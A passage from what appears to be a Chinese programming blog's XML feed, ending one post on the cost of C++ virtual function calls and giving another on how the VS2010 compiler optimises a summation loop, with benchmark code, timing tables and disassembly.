class="comment">//cout&lt;&lt;v.size()&lt;&lt;endl;</span></span><br><span class="line">	&#125;</span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testVirtualVectorAt</span><span class="params">(IVector&amp; v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStart;      <span class="comment">//计时开始</span></span><br><span class="line">	<span class="keyword">clock_t</span> nTimeStop;       <span class="comment">//计时结束</span></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	nTimeStart = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1</span>; ++j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += v.at(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	nTimeStop = clock();    <span class="comment">//</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">"耗时："</span>&lt;&lt;(<span class="keyword">double</span>)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;<span class="string">"秒"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sum:"</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="keyword">sizeof</span>(VirtualVector)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	Vector *v = <span class="keyword">new</span> Vector(size);</span><br><span class="line">	VirtualVector *V = <span class="keyword">new</span> VirtualVector(size);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVectorPush:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line">	testVectorPush(*v);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVirtualVectorPush:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line">	testVirtualVectorPush(*V);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVectorAt:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line">	testVectorAt(*v);</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"testVirtualVectorAt:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line">	testVirtualVectorAt(*V);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>at操作中增加求和后的统计结果：</p>
<table>
<thead>
<tr>
<th></th>
<th>push_back</th>
<th>at 增加求和代码</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vector</td>
<td>0.265s</td>
<td>6.893s</td>
</tr>
<tr>
<td>VirtualVector</td>
<td>0.328s</td>
<td>7.125s</td>
</tr>
<tr>
<td>倍数</td>
<td>1.23</td>
<td>1.03</td>
</tr>
</tbody>
</table>
<p>只是简单增加了一个求和代码，我们可以看到，倍数变成了1.03，也就是说虚函数的消耗基本可以忽略了。</p>
<p><strong>所以说，虚函数的效率到底低不低和实际要调用的函数的耗时有关，当函数本身的的耗时越长，则虚函数的影响则越小。</strong></p>
<p>再从另一个角度来看，一个虚函数调用到底额外消耗了多长时间？</p>
<p>从统计数据来看100,000,000次函数调用，虚函数总共额外消耗了0.05~0.23秒（VirtualVector对应时间减去Vector时间），</p>
<p><strong>也就是说，1亿次调用，虚函数额外花的时间是0.x到2.3秒。</strong></p>
<p>也就是说，如果你有个函数，要被调用1亿次，而这1亿次调用所花的时间是几秒，十几秒，且你不能容忍它慢一二秒，那么就干掉虚函数吧^_^。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>虚函数调用效率和继承层数无关；</li>
<li>其实虚函数还是挺快的。</li>
<li>如果真的要完全移除虚函数，那么如果要实现运行时多态，则要用到函数指针，据上面的分析，函数指针基本具有虚函数的所有缼点（要传递函数指针，同样无法内联，同样影响流水线），且函数指针会使代码混乱。</li>
</ul>
<p>BTW：测试cpu是i5。</p>
<p>TODO：测试指针函数，boost::bind的效率</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>C++编译器到底能帮我们把代码优化到什么程度？</title>
    <url>/cpp-compiler-optimization/</url>
    <content><![CDATA[<p>TODO: 用while写法的程序会不会循环展开？</p>
<p>一个简单的累加求和程序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">TYPE S=<span class="number">0</span>;  </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; SIZE; i++) &#123;  </span><br><span class="line">	S += a[i];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很多人都觉得这个程序写得不好，编译器不能生成很好的汇编代码。于是有了以下的几种“优化”：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE int</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 10000</span></span><br><span class="line"> </span><br><span class="line">	TYPE* a=<span class="keyword">new</span> TYPE[SIZE];  </span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;SIZE; ++i)&#123;</span><br><span class="line">		a[i] = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//求和，通常版本</span></span><br><span class="line">	TYPE S=<span class="number">0</span>;  </span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; SIZE; i++) &#123;  </span><br><span class="line">		S += a[i];  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;S&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> </span><br><span class="line">	TYPE S2 = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//版本1：认为中间产生的变量i是多余的，改为用移动指针</span></span><br><span class="line">	TYPE* end = a + SIZE;</span><br><span class="line">	<span class="keyword">for</span>( ; a != end; ) &#123;  </span><br><span class="line">		S2 += *(a++);  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;S2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//版本1中把a移到了数组的最后，现在移回原来的位置</span></span><br><span class="line">	a = end - SIZE;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//版本2：认为循环次数太多了，可以改为减少循环次数</span></span><br><span class="line">	TYPE S3 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SIZE; )&#123; <span class="comment">//仅当SIZE为偶数时</span></span><br><span class="line">		S3 += a[i++];</span><br><span class="line">		S3 += a[i++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;S3&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//版本3：认为版本2中会使CPU不能乱序执行，降低了效率，应该改为汇编，把中间结果放到独立的寄存器中</span></span><br><span class="line">	<span class="comment">//谢谢 menzi11 的文章，让我认识到程序中相关的数据会让CPU不能乱序执行。</span></span><br><span class="line">	<span class="comment">//这里用伪汇编代替</span></span><br><span class="line">	TYPE S4 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">register</span> TYPE r1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">register</span> TYPE r2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SIZE; )&#123; <span class="comment">//仅当SIZE为偶数时</span></span><br><span class="line">		r1 += a[i++];</span><br><span class="line">		r2 += a[i++];</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;r1 + r2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的几种版本都合理，但是这些优化都是建立在编译器不能生成高效的汇编代码的假设上的。</p>
<p>下面来看下编译器生成的结果（vs2010，release)：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; SIZE; i++) &#123;  </span><br><span class="line">		S += a[i];  </span><br><span class="line"><span class="number">013B</span>1040  mov         ebx,dword ptr [eax+<span class="number">4</span>]  <span class="comment">//把a[0],a[4],a[8]...累加到ebx中</span></span><br><span class="line"><span class="number">013B</span>1043  add         ecx,dword ptr [eax<span class="number">-8</span>]  <span class="comment">//把a[1],a[5],a[9]...累加到ecx中</span></span><br><span class="line"><span class="number">013B</span>1046  add         edx,dword ptr [eax<span class="number">-4</span>]  <span class="comment">//把a[2],a[6],a[10]...累加到edx中</span></span><br><span class="line"><span class="number">013B</span>1049  add         esi,dword ptr [eax]    <span class="comment">//把a[3],a[7],a[11]...累加到esi中</span></span><br><span class="line"><span class="number">013B</span>104B  add         dword ptr [ebp<span class="number">-4</span>],ebx  </span><br><span class="line"><span class="number">013B</span>104E  add         eax,<span class="number">10</span>h  </span><br><span class="line"><span class="number">013B</span>1051  dec         dword ptr [ebp<span class="number">-8</span>]  </span><br><span class="line"><span class="number">013B</span>1054  jne         main+<span class="number">40</span>h (<span class="number">13B</span>1040h)  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;S&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="number">013B</span>1056  mov         eax,dword ptr [ebp<span class="number">-4</span>]  </span><br><span class="line"><span class="number">013B</span>1059  add         eax,esi  		      </span><br><span class="line"><span class="number">013B</span>105B  add         eax,edx  </span><br><span class="line"><span class="number">013B</span>105D  mov         edx,dword ptr [__imp_std::<span class="built_in">endl</span> (<span class="number">13B</span>204Ch)]  </span><br><span class="line"><span class="number">013B</span>1063  add         ecx,eax                <span class="comment">//上面的3条add指令把ebx，ecx，edx，edi都加到ecx中，即ecx是累加结果</span></span><br></pre></td></tr></table></figure>
<p><strong>可见编译器生成的代码是最好的代码，消灭了中间变量i，减少了循环次数，消灭了会造成CPU不能乱序执行的因素。</strong></p>
<p>BTW：</p>
<p>有人可能会有疑问：要是size不是偶数，编译器能生成类似的高效汇编代码不？</p>
<p>当SIZE = 9999时：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当SIZE = 9999时，编译器把中间结果放到三个寄存器中，perfect</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; SIZE; i++) &#123;  </span><br><span class="line">		S += a[i];  </span><br><span class="line"><span class="number">01341030</span>  add         ecx,dword ptr [eax<span class="number">-8</span>]  </span><br><span class="line"><span class="number">01341033</span>  add         edx,dword ptr [eax<span class="number">-4</span>]  </span><br><span class="line"><span class="number">01341036</span>  add         esi,dword ptr [eax]  </span><br><span class="line"><span class="number">01341038</span>  add         eax,<span class="number">0</span>Ch  </span><br><span class="line"><span class="number">0134103B</span>  dec         ebx  </span><br><span class="line"><span class="number">0134103</span>C  jne         main+<span class="number">30</span>h (<span class="number">1341030</span>h)  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>当SIZE  = 9997 时：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当SIZE = 9997时，有点复杂，先把a[0]到a[9995]累加到ecx和edx中</span></span><br><span class="line"><span class="comment">//再把a[9996]入到edi中，最后把ecx，edi都加到edx中</span></span><br><span class="line"><span class="comment">//edx压栈，调用operator&lt;&lt; 函数</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; SIZE; i++) &#123;  </span><br><span class="line"><span class="number">00</span>D31024  <span class="keyword">xor</span>         eax,eax  </span><br><span class="line">		S += a[i];  </span><br><span class="line"><span class="number">00</span>D31026  add         ecx,dword ptr [esi+eax*<span class="number">4</span>]  </span><br><span class="line"><span class="number">00</span>D31029  add         edx,dword ptr [esi+eax*<span class="number">4</span>+<span class="number">4</span>]  </span><br><span class="line"><span class="number">00</span>D3102D  add         eax,<span class="number">2</span>  </span><br><span class="line"><span class="number">00</span>D31030  cmp         eax,<span class="number">270</span>Ch  </span><br><span class="line"><span class="number">00</span>D31035  jl          main+<span class="number">26</span>h (<span class="number">0</span>D31026h)  </span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; SIZE; i++) &#123;  </span><br><span class="line"><span class="number">00</span>D31037  cmp         eax,<span class="number">270</span>Dh  </span><br><span class="line"><span class="number">00</span>D3103C  jge         main+<span class="number">41</span>h (<span class="number">0</span>D31041h)  </span><br><span class="line">		S += a[i];  </span><br><span class="line"><span class="number">00</span>D3103E  mov         edi,dword ptr [esi+eax*<span class="number">4</span>]  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;S&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="number">00</span>D31041  mov         eax,dword ptr [__imp_std::<span class="built_in">endl</span> (<span class="number">0</span>D3204Ch)]  </span><br><span class="line"><span class="number">00</span>D31046  add         edx,ecx  </span><br><span class="line"><span class="number">00</span>D31048  mov         ecx,dword ptr [__imp_std::<span class="built_in">cout</span> (<span class="number">0</span>D32050h)]  </span><br><span class="line"><span class="number">00</span>D3104E  push        eax  </span><br><span class="line"><span class="number">00</span>D3104F  add         edx,edi  </span><br><span class="line"><span class="number">00</span>D31051  push        edx  </span><br><span class="line"><span class="number">00</span>D31052  call        dword ptr [__imp_std::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt; &gt;::<span class="keyword">operator</span>&lt;&lt; (<span class="number">0</span>D32048h)]</span><br></pre></td></tr></table></figure>
<p>上面的分析都是SIZE，即数组的大小是已知情况下，那个数组大小是未知情况下，编译器又会怎样？</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">TYPE <span class="title">mySum</span><span class="params">(TYPE* a, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">	TYPE s = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)&#123;</span><br><span class="line">		s += a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成的汇编代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先累加a[0] 到 a[size-2]</span></span><br><span class="line">	TYPE s = <span class="number">0</span>;</span><br><span class="line"><span class="number">00</span>ED100C  <span class="keyword">xor</span>         esi,esi  </span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)&#123;</span><br><span class="line"><span class="number">00</span>ED100E  <span class="keyword">xor</span>         eax,eax  </span><br><span class="line"><span class="number">00</span>ED1010  cmp         ebx,<span class="number">2</span>  </span><br><span class="line"><span class="number">00</span>ED1013  jl          mySum+<span class="number">27</span>h (<span class="number">0</span>ED1027h)  </span><br><span class="line"><span class="number">00</span>ED1015  dec         ebx  </span><br><span class="line">		s += a[i];</span><br><span class="line"><span class="number">00</span>ED1016  add         ecx,dword ptr [edi+eax*<span class="number">4</span>]    <span class="comment">//a[0],a[2],a[4]...加到ecx中</span></span><br><span class="line"><span class="number">00</span>ED1019  add         edx,dword ptr [edi+eax*<span class="number">4</span>+<span class="number">4</span>]  <span class="comment">//a[1],a[3],a[5]...加到edx中</span></span><br><span class="line"><span class="number">00</span>ED101D  add         eax,<span class="number">2</span>  </span><br><span class="line"><span class="number">00</span>ED1020  cmp         eax,ebx  </span><br><span class="line"><span class="number">00</span>ED1022  jl          mySum+<span class="number">16</span>h (<span class="number">0</span>ED1016h)  </span><br><span class="line"><span class="number">00</span>ED1024  mov         ebx,dword ptr [size]  </span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i)&#123;</span><br><span class="line"><span class="number">00</span>ED1027  cmp         eax,ebx                       <span class="comment">//判断最后一个元素有没有加上</span></span><br><span class="line"><span class="number">00</span>ED1029  jge         mySum+<span class="number">2</span>Eh (<span class="number">0</span>ED102Eh)  </span><br><span class="line">		s += a[i];</span><br><span class="line"><span class="number">00</span>ED102B  mov         esi,dword ptr [edi+eax*<span class="number">4</span>]     <span class="comment">//当size是奇数是会执行，偶数时不会执行</span></span><br><span class="line"><span class="number">00</span>ED102E  add         edx,ecx  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>C++的编译器生成的汇编代码在绝大多数情况下都和人写出的最好的汇编代码相当。</p>
<p>关键的一点是编译器会不断升级，适应新的cpu指令，体系等，手写的汇编代码则通常悲剧了。</p>
<p><strong>知道编译器能优化到什么程度，编译器到底怎样优化，是程序员很重要的素质。</strong></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>compiler</tag>
        <tag>cpp</tag>
      </tags>
  </entry>
</search>
